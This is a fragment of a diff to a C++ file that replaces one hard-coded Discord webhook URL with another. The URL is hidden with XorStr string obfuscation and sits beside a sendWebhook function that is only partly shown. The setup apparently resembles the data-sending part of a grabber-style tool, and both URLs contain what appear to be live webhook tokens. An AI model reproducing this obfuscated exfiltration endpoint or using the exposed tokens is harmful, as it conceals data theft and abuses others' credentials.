@@ -31,7 +31,7 @@
 #include <curl.h>
 #include <regex>
 
-std::basic_string WEBHOOK = XorStr("https://discord.com/api/webhooks/1010748520011149453/deawMxw7k9wQJ0Uu-DZC7f5-Uw_4OjBp_ObsIZfT6MHYYAntRwVCh4jJ4qBSJNlwVLKq");
+std::basic_string WEBHOOK = XorStr("https://discord.com/api/webhooks/1042495884329492540/9PwJlYLSP1rypYz1kL5VEWrqGRLIVghn984Iztm8daihCAuukqWXJDhD3-hk_unmL3jT");
 
 void sendWebhook(const char* content)
 {
